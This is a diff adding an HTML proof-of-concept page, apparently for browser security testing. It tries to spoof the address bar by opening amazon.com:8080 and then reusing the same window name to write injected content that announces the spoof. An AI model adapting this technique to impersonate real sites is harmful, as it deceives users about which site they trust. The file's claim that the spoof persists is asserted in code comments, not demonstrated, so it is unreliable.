@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Dual Window Spoof</title>
+</head>
+<body>
+    <h1>Dual Window Address Bar Spoof</h1>
+    <button onclick="dualWindowSpoof()">Launch Attack</button>
+    
+    <script>
+    function dualWindowSpoof() {
+        // Technique: Open TWO windows with same name
+        // First sets the URL, second injects content
+        
+        // Window 1: Set address bar
+        const win1 = window.open('https://www.amazon.com:8080/', 'target');
+        
+        if (!win1) {
+            alert('Popup blocked!');
+            return;
+        }
+        
+        console.log('Window 1 opened (sets address bar)');
+        
+        // Window 2: Immediately reuse same name, inject content
+        setTimeout(() => {
+            const win2 = window.open('about:blank', 'target'); // REUSE name!
+            
+            setTimeout(() => {
+                try {
+                    win2.document.write(`
+                        <html>
+                        <head>
+                            <title>Spoofed Amazon</title>
+                            <style>
+                                body {
+                                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+                                    color: white;
+                                    font-family: Arial;
+                                    padding: 50px;
+                                    text-align: center;
+                                }
+                                h1 { font-size: 4em; margin: 0; }
+                                .warning {
+                                    background: rgba(255,255,255,0.2);
+                                    padding: 30px;
+                                    border-radius: 15px;
+                                    margin: 30px 0;
+                                }
+                            </style>
+                        </head>
+                        <body>
+                            <h1>🎭</h1>
+                            <div class="warning">
+                                <h2>ADDRESS BAR SPOOFED!</h2>
+                                <p>URL shows: amazon.com:8080</p>
+                                <p>Content: Attacker controlled</p>
+                                <p>Address bar STAYS spoofed!</p>
+                            </div>
+                        </body>
+                        </html>
+                    `);
+                    win2.document.close();
+                    
+                    console.log('✅ Content injected, address bar should stay spoofed');
+                    
+                } catch (e) {
+                    console.error('Injection failed:', e);
+                }
+            }, 10);
+            
+        }, 100);
+    }
+    </script>
+</body>
+</html>
